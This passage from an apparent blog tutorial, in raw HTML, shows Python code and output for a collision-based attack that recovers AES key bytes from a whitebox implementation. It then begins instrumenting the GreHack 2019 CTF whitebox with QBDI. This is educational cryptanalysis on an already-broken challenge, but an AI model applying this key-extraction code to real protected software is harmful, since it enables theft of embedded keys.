class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">]</span>\n\n<span class=\"c1\"># Pair of colliding plaintexts</span>\n<span class=\"n\">input3</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">91</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">229</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">]</span>\n<span class=\"n\">input4</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">3</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">]</span>\n\n<span class=\"c1\"># Pair of colliding plaintexts</span>\n<span class=\"n\">input5</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">170</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">85</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">]</span>\n<span class=\"n\">input6</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">217</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">210</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">]</span>\n\n\n<span class=\"c1\"># Verify that collisions are indeed existing after a round of whitebox</span>\n<span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"n\">whitebox</span><span class=\"p\">(</span><span class=\"n\">input1</span><span class=\"p\">)</span>\n<span class=\"n\">s2</span> <span class=\"o\">=</span> <span class=\"n\">whitebox</span><span class=\"p\">(</span><span class=\"n\">input2</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain1 = </span><span class=\"se\">\\t</span><span class=\"si\">{input1}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{s1}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain2 = </span><span class=\"se\">\\t</span><span class=\"si\">{input2}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{s2}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n\n<span class=\"n\">s3</span> <span class=\"o\">=</span> <span class=\"n\">whitebox</span><span class=\"p\">(</span><span class=\"n\">input3</span><span class=\"p\">)</span>\n<span class=\"n\">s4</span> <span class=\"o\">=</span> <span class=\"n\">whitebox</span><span class=\"p\">(</span><span class=\"n\">input4</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain3 = </span><span class=\"se\">\\t</span><span class=\"si\">{input3}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{s3}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain4 = </span><span class=\"se\">\\t</span><span class=\"si\">{input4}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{s4}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n\n<span class=\"c1\"># Look for potential keys</span>\n<span class=\"n\">c0</span> <span class=\"o\">=</span> <span class=\"n\">find_colliding_keys</span><span class=\"p\">(</span><span class=\"n\">input1</span><span class=\"p\">,</span> <span class=\"n\">input2</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"==&gt;</span><span class=\"se\">\\t</span><span class=\"s2\">c0 has {len(c0)} potential keys\"</span><span class=\"p\">)</span>\n<span class=\"n\">c1</span> <span class=\"o\">=</span> <span class=\"n\">find_colliding_keys</span><span class=\"p\">(</span><span class=\"n\">input3</span><span class=\"p\">,</span> <span class=\"n\">input4</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"==&gt;</span><span class=\"se\">\\t</span><span class=\"s2\">c1 has {len(c1)} potential keys\"</span><span class=\"p\">)</span>\n\n<span class=\"c1\"># Keep only common potential keys by doing an intersection</span>\n<span class=\"n\">set_c0</span> <span class=\"o\">=</span> <span class=\"nb\">set</span><span class=\"p\">([</span><span class=\"nb\">bytes</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"p\">)</span> <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"n\">c0</span><span class=\"p\">])</span>\n<span class=\"n\">set_c1</span> <span class=\"o\">=</span> <span class=\"nb\">set</span><span class=\"p\">([</span><span class=\"nb\">bytes</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"p\">)</span> <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"n\">c1</span><span class=\"p\">])</span>\n<span class=\"n\">pk</span> <span class=\"o\">=</span> <span class=\"n\">set_c0</span><span class=\"o\">.</span><span class=\"n\">intersection</span><span class=\"p\">(</span><span class=\"n\">set_c1</span><span class=\"p\">)</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"Potential keys with 2 pairs of plaintexts : </span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n<span class=\"n\">pprint</span><span class=\"p\">(</span><span class=\"n\">pk</span><span class=\"p\">)</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"-\"</span><span class=\"o\">*</span><span class=\"mi\">80</span><span class=\"p\">)</span>\n<span class=\"c1\"># Refine potential keys with a third pair of plaintexts</span>\n<span class=\"n\">s5</span> <span class=\"o\">=</span> <span class=\"n\">whitebox</span><span class=\"p\">(</span><span class=\"n\">input5</span><span class=\"p\">)</span>\n<span class=\"n\">s6</span> <span class=\"o\">=</span> <span class=\"n\">whitebox</span><span class=\"p\">(</span><span class=\"n\">input6</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain5 = </span><span class=\"se\">\\t</span><span class=\"si\">{input5}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{s5}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain6 = </span><span class=\"se\">\\t</span><span class=\"si\">{input6}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{s6}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n\n<span class=\"n\">c2</span> <span class=\"o\">=</span> <span class=\"n\">find_colliding_keys</span><span class=\"p\">(</span><span class=\"n\">input5</span><span class=\"p\">,</span> <span class=\"n\">input6</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"==&gt;</span><span class=\"se\">\\t</span><span class=\"s2\">c2 has {len(c2)} potential keys\"</span><span class=\"p\">)</span>\n\n<span class=\"c1\"># Set of potential keys is now unique, we found the good key !</span>\n<span class=\"n\">set_c2</span> <span class=\"o\">=</span> <span class=\"nb\">set</span><span class=\"p\">([</span><span class=\"nb\">bytes</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"p\">)</span> <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"n\">c2</span><span class=\"p\">])</span>\n<span class=\"n\">pk</span> <span class=\"o\">=</span> <span class=\"n\">pk</span><span class=\"o\">.</span><span class=\"n\">intersection</span><span class=\"p\">(</span><span class=\"n\">set_c2</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"Potential keys with 3 pairs of plaintexts : \"</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">pk</span><span class=\"p\">)</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"-\"</span><span class=\"o\">*</span><span class=\"mi\">80</span><span class=\"p\">)</span>\n<span class=\"c1\"># Key to recover</span>\n<span class=\"n\">wb_key</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">222</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">173</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">190</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">239</span><span class=\"p\">]</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"</span><span class=\"se\">\\n</span><span class=\"s2\">Verifying that we found the good key-bytes\"</span><span class=\"p\">)</span>\n<span class=\"n\">recovered_key</span> <span class=\"o\">=</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">pk</span><span class=\"o\">.</span><span class=\"n\">pop</span><span class=\"p\">())</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"recovered_key</span><span class=\"se\">\\t</span><span class=\"s2\">= </span><span class=\"si\">{recovered_key}</span><span class=\"se\">\\n</span><span class=\"s2\">whitebox_key</span><span class=\"se\">\\t</span><span class=\"s2\">= </span><span class=\"si\">{wb_key}</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"recovered_key[0] == wk_key[0] : \"</span><span class=\"p\">,</span> <span class=\"n\">recovered_key</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">==</span> <span class=\"n\">wb_key</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">])</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"recovered_key[5] == wk_key[5] : \"</span><span class=\"p\">,</span> <span class=\"n\">recovered_key</span><span class=\"p\">[</span><span class=\"mi\">5</span><span class=\"p\">]</span> <span class=\"o\">==</span> <span class=\"n\">wb_key</span><span class=\"p\">[</span><span class=\"mi\">5</span><span class=\"p\">])</span>\n</pre> \n   </div> \n   <pre class=\"literal-block\">\nPlain1 =    [16, 0, 0, 0, 0, 55, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nstate =     [176, 215, 15, 54, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]\n\nPlain2 =    [12, 0, 0, 0, 0, 17, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nstate =     [176, 74, 238, 171, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]\n\nPlain3 =    [91, 0, 0, 0, 0, 229, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nstate =     [179, 6, 249, 252, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]\n\nPlain4 =    [99, 0, 0, 0, 0, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nstate =     [179, 160, 164, 98, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]\n\n==&gt; c0 has 264 potential keys\n==&gt; c1 has 284 potential keys\nPotential keys with 2 pairs of plaintexts :\n\n{b'.\\x00\\x00\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00',\n b'\\xb5\\x00\\x00\\x00\\x00c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00',\n b'\\xde\\x00\\x00\\x00\\x00\\xad\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'}\n--------------------------------------------------------------------------------\nPlain5 =    [170, 0, 0, 0, 0, 85, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nstate =     [142, 39, 239, 232, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]\n\nPlain6 =    [217, 0, 0, 0, 0, 210, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nstate =     [142, 77, 43, 142, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]\n\n==&gt; c2 has 268 potential keys\nPotential keys with 3 pairs of plaintexts :\n{b'\\xde\\x00\\x00\\x00\\x00\\xad\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'}\n--------------------------------------------------------------------------------\n\nVerifying that we found the good key-bytes\nrecovered_key       = [222, 0, 0, 0, 0, 173, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nwhitebox_key        = [222, 12, 12, 12, 12, 173, 12, 12, 12, 12, 190, 12, 12, 12, 12, 239]\nrecovered_key[0] == wk_key[0] :  True\nrecovered_key[5] == wk_key[5] :  True\n</pre> \n  </div> \n  <div class=\"section\" id=\"finalizing-the-attack\"> \n   <h4>Finalizing the attack</h4> \n   <p>As you can see above, with 3 pairs of colliding plaintexts, we managed to recover 2 bytes of the key: <span class=\"math\">\\(Ob_0\\)</span> and <span class=\"math\">\\(Ob_5\\)</span>. If we wanted to recover <span class=\"math\">\\(Ob_{10}\\)</span> and <span class=\"math\">\\(Ob_{15}\\)</span> we would need to set <span class=\"math\">\\(Ib_0\\)</span> and <span class=\"math\">\\(Ib_5\\)</span> to a fixed value, find collisions by modifying <span class=\"math\">\\(Ib_{10}\\)</span> and <span class=\"math\">\\(Ib_{15}\\)</span>, and finally look for a colliding key, by iterating over all the possible values of <span class=\"math\">\\(k_{10}\\)</span> and <span class=\"math\">\\(k_{15}\\)</span>.</p> \n   <p>Doing this, we would break 4 bytes of the key, and we can do this operation for the 3 last independent parts of AES, to recover the full first round key (which is equal to the original AES-128 key)!</p> \n   <p>To demonstrate the feasibility, we will be looking at an example, and break it using the collision-based attack we just described.</p> \n  </div> \n </div> \n</div> \n<div class=\"section\" id=\"defeating-whiteboxes-a-qbdi-showcase\"> \n <h2>Defeating whiteboxes: a QBDI showcase</h2> \n <div class=\"section\" id=\"our-target-grehack2019-whitebox\"> \n  <h3>Our target: GreHack2019 whitebox</h3> \n  <p>As a demonstration, I decided to look into the most recent whitebox I could find. Thanksfully, SideChannelMarvels has a repository full of already broken whiteboxes <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id31\" id=\"id16\">[9]</a>. There is one from 2019, from GreHack 2019 CTF, already broken by a few researchers <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id32\" id=\"id17\">[10]</a> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id33\" id=\"id18\">[11]</a>, so let’s get started with this one.</p> \n  <p>The challenge is composed of 3 files:</p> \n  <ul class=\"simple\"> \n   <li><tt class=\"docutils literal\">enc.c</tt>: contains the definition of the <tt class=\"docutils literal\">encrypt()</tt> function</li> \n   <li><tt class=\"docutils literal\">instr.c</tt>: content of the <tt class=\"docutils literal\">encrypt()</tt> function</li> \n   <li><tt class=\"docutils literal\">tables.h</tt>: 2 Mb header of hardcoded values (whitebox tables)</li> \n  </ul> \n  <p>This is what <tt class=\"docutils literal\">enc.c</tt> looks like:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"kt\">void</span>\n<span class=\"nf\">encrypt</span> <span class=\"p\">(</span><span class=\"kt\">uint8_t</span> <span class=\"o\">*</span><span class=\"n\">buffer</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">uint8_t</span> <span class=\"n\">s</span><span class=\"p\">[</span><span class=\"mi\">42</span><span class=\"p\">];</span>\n  <span class=\"n\">memcpy</span><span class=\"p\">(</span><span class=\"n\">s</span><span class=\"p\">,</span> <span class=\"n\">buffer</span><span class=\"p\">,</span> <span class=\"mi\">16</span><span class=\"p\">);</span>\n\n  <span class=\"cp\">#include</span> <span class=\"cpf\">\"instr.c\"</span><span class=\"cp\"></span>\n  <span class=\"n\">memcpy</span><span class=\"p\">(</span><span class=\"n\">buffer</span><span class=\"p\">,</span> <span class=\"n\">s</span><span class=\"p\">,</span> <span class=\"mi\">16</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n</pre> \n  </div> \n  <p>The <tt class=\"docutils literal\">encrypt</tt> function takes a 16-byte input (plaintext to encrypt), and puts it in an unknown structure. Following this, some magic is performed in <tt class=\"docutils literal\">instr.c</tt>, and finally, a 16-byte output is copied from the unknown structure back to the input buffer (encrypted plaintext).</p> \n  <p>We can compile this as a shared library, so we can call the <tt class=\"docutils literal\">encrypt()</tt> function easily.</p> \n  <div class=\"highlight\"> \n   <pre><span></span>gcc enc.c -shared -fpic -o wb.so\n</pre> \n  </div> \n </div> \n <div class=\"section\" id=\"analyzing-the-target-with-qbdi\"> \n  <h3>Analyzing the target with QBDI</h3> \n  <p>So far, we have absolutely no information about what is happening in that <tt class=\"docutils literal\">encrypt()</tt> function. If you have a look at its source code, it is full of data lookups from the tables, so it is probably a whiteboxed algorithm. One common way to understand the behaviour of a program (especially for cryptographic ones), is to have a look at memory accesses, and their patterns. You can learn a lot about your target, just by analyzing how often, and in which order data is being accessed.</p> \n  <p>To do this, we will use QBDI <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id34\" id=\"id19\">[12]</a>, that is the perfect solution for this kind of traces.</p> \n  <blockquote>\n    Note: For this example, the sources of the whitebox were available, but this is not a requirement for QBDI. \n  </blockquote> \n  <p>Let’s get started, and run the <tt class=\"docutils literal\">encrypt()</tt> function with QBDI. Below is a full snippet to do so. What it does is the following:</p> \n  <ol class=\"arabic simple\"> \n   <li>Load the whitebox as a library with <tt class=\"docutils literal\">ctypes</tt></li> \n   <li>Initialize a QBDI VM</li> \n   <li>Allocate an input buffer (16 bytes), and write data to it</li> \n   <li>Call the <tt class=\"docutils literal\">encrypt</tt> function with the freshly filled buffer as parameter</li> \n   <li>Dump data from the same buffer (the <tt class=\"docutils literal\">encrypt</tt> function writes the encrypted block to it)</li> \n  </ol> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"kn\">import</span> <span class=\"nn\">pyqbdi</span>\n<span class=\"kn\">import</span> <span class=\"nn\">ctypes</span>\n\n<span class=\"c1\"># Load the whitebox library using ctypes, and get a ptr to encrypt</span>\n<span class=\"k\">def</span> <span class=\"nf\">load_wb</span><span class=\"p\">():</span>\n    <span class=\"n\">wb</span> <span class=\"o\">=</span> <span class=\"n\">ctypes</span><span class=\"o\">.</span><span class=\"n\">cdll</span><span class=\"o\">.</span><span class=\"n\">LoadLibrary</span><span class=\"p\">(</span><span class=\"s2\">\"./wb.so\"</span><span class=\"p\">)</span>\n    <span class=\"n\">encrypt_ptr</span> <span class=\"o\">=</span> <span class=\"n\">ctypes</span><span class=\"o\">.</span><span class=\"n\">cast</span><span class=\"p\">(</span><span class=\"n\">wb</span><span class=\"o\">.</span><span class=\"n\">encrypt</span><span class=\"p\">,</span> <span class=\"n\">ctypes</span><span class=\"o\">.</span><span class=\"n\">c_void_p</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">value</span>\n    <span class=\"k\">return</span> <span class=\"n\">encrypt_ptr</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">instanciate_vm</span><span class=\"p\">(</span><span class=\"n\">encrypt_ptr</span><span class=\"p\">):</span>\n    <span class=\"c1\"># create a QBDI VM</span>\n    <span class=\"n\">vm</span> <span class=\"o\">=</span> <span class=\"n\">pyqbdi</span><span class=\"o\">.</span><span class=\"n\">VM</span><span class=\"p\">()</span>\n    <span class=\"n\">vm</span><span class=\"o\">.</span><span class=\"n\">addInstrumentedModuleFromAddr</span><span class=\"p\">(</span><span class=\"n\">encrypt_ptr</span><span class=\"p\">)</span>\n\n    <span class=\"c1\"># Allocate a stack for the QBDI vm</span>\n    <span class=\"n\">state</span> <span class=\"o\">=</span> <span class=\"n\">vm</span><span class=\"o\">.</span><span class=\"n\">getGPRState</span><span class=\"p\">()</span>\n    <span class=\"n\">stack</span> <span class=\"o\">=</span> <span class=\"n\">pyqbdi</span><span class=\"o\">.</span><span class=\"n\">allocateVirtualStack</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">,</span> <span class=\"mh\">0x1000000</span><span class=\"p\">)</span>\n    <span class=\"k\">return</span> <span class=\"n\">vm</span>\n\n\n<span class=\"k\">def</span> <span class=\"nf\">encrypt</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">,</span> <span class=\"n\">encrypt_ptr</span><span class=\"p\">,</span> <span class=\"n\">buffer_ptr</span><span class=\"p\">,</span> <span class=\"n\">data</span><span class=\"p\">):</span>\n    <span class=\"c1\"># backup registers</span>\n    <span class=\"n\">gpr</span> <span class=\"o\">=</span> <span class=\"n\">vm</span><span class=\"o\">.</span><span class=\"n\">getGPRState</span><span class=\"p\">()</span>\n    <span class=\"n\">rsp</span> <span class=\"o\">=</span> <span class=\"n\">gpr</span><span class=\"o\">.</span><span class=\"n\">rsp</span> <span class=\"p\">;</span> <span class=\"n\">rbp</span> <span class=\"o\">=</span> <span class=\"n\">gpr</span><span class=\"o\">.</span><span class=\"n\">rbp</span>\n    <span class=\"c1\"># write data to input buffer</span>\n    <span class=\"n\">pyqbdi</span><span class=\"o\">.</span><span class=\"n\">writeMemory</span><span class=\"p\">(</span><span class=\"n\">buffer_ptr</span><span class=\"p\">,</span> <span class=\"nb\">bytes</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">))</span>\n\n    <span class=\"c1\"># encrypt and dump encrypted content</span>\n    <span class=\"n\">success</span> <span class=\"o\">=</span> <span class=\"n\">vm</span><span class=\"o\">.</span><span class=\"n\">call</span><span class=\"p\">(</span><span class=\"n\">encrypt_ptr</span><span class=\"p\">,</span> <span class=\"p\">[</span><span class=\"n\">buffer_ptr</span><span class=\"p\">])</span>\n    <span class=\"n\">state</span> <span class=\"o\">=</span> <span class=\"n\">pyqbdi</span><span class=\"o\">.</span><span class=\"n\">readMemory</span><span class=\"p\">(</span><span class=\"n\">buffer_ptr</span><span class=\"p\">,</span> <span class=\"mi\">16</span><span class=\"p\">)</span>\n    <span class=\"c1\"># restore registers</span>\n    <span class=\"n\">gpr</span> <span class=\"o\">=</span> <span class=\"n\">vm</span><span class=\"o\">.</span><span class=\"n\">getGPRState</span><span class=\"p\">()</span>\n    <span class=\"n\">gpr</span><span class=\"o\">.</span><span class=\"n\">rsp</span> <span class=\"o\">=</span> <span class=\"n\">rsp</span> <span class=\"p\">;</span> <span class=\"n\">gpr</span><span class=\"o\">.</span><span class=\"n\">rbp</span> <span class=\"o\">=</span> <span class=\"n\">rbp</span>\n    <span class=\"k\">return</span> <span class=\"n\">state</span>\n</pre> \n  </div> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"k\">def</span> <span class=\"nf\">main</span><span class=\"p\">():</span>\n    <span class=\"n\">encrypt_ptr</span> <span class=\"o\">=</span> <span class=\"n\">load_wb</span><span class=\"p\">()</span>\n    <span class=\"n\">vm</span> <span class=\"o\">=</span> <span class=\"n\">instanciate_vm</span><span class=\"p\">(</span><span class=\"n\">encrypt_ptr</span><span class=\"p\">)</span>\n\n    <span class=\"n\">buffer_ptr</span> <span class=\"o\">=</span> <span class=\"n\">pyqbdi</span><span class=\"o\">.</span><span class=\"n\">allocateMemory</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span>\n    <span class=\"n\">state</span> <span class=\"o\">=</span> <span class=\"n\">encrypt</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">,</span> <span class=\"n\">encrypt_ptr</span><span class=\"p\">,</span> <span class=\"n\">buffer_ptr</span><span class=\"p\">,</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span><span class=\"p\">)</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"wb({[0]*16}) = </span><span class=\"se\">\\n\\t</span><span class=\"s2\">\"</span><span class=\"p\">,</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">))</span>\n\n<span class=\"n\">main</span><span class=\"p\">()</span>\n</pre> \n  </div> \n  <pre class=\"literal-block\">\nwb([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]) =\n     [200, 48, 81, 207, 15, 188, 94, 26, 143, 211, 192, 201, 176, 229, 73, 159]\n</pre> \n </div> \n <div class=\"section\" id=\"recording-and-visualizing-memory-accesses\"> \n  <h3>Recording and visualizing memory accesses</h3> \n  <p>With the previous snippet, we can easily encrypt an input, and observe its output. To learn a bit more about the algorithm, we will record and visualize every memory accesses it does. To do so, we will use the memory record feature from QBDI. Thanks to the snippet below, we can easily trace the memory accesses on a graph, and visualize them.</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"c1\"># Callback, called on every memory access</span>\n<span class=\"k\">def</span> <span class=\"nf\">mem_cbk</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">,</span> <span class=\"n\">gpr</span><span class=\"p\">,</span> <span class=\"n\">fpr</span><span class=\"p\">,</span> <span class=\"n\">cb_data</span><span class=\"p\">):</span>\n    <span class=\"n\">accesses</span> <span class=\"o\">=</span> <span class=\"n\">cb_data</span><span class=\"p\">[</span><span class=\"s2\">\"accesses\"</span><span class=\"p\">]</span>\n    <span class=\"n\">stack</span> <span class=\"o\">=</span> <span class=\"n\">cb_data</span><span class=\"p\">[</span><span class=\"s2\">\"stack\"</span><span class=\"p\">]</span>\n    <span class=\"n\">buffer_ptr</span> <span class=\"o\">=</span> <span class=\"n\">cb_data</span><span class=\"p\">[</span><span class=\"s2\">\"buffer_ptr\"</span><span class=\"p\">]</span>\n    <span 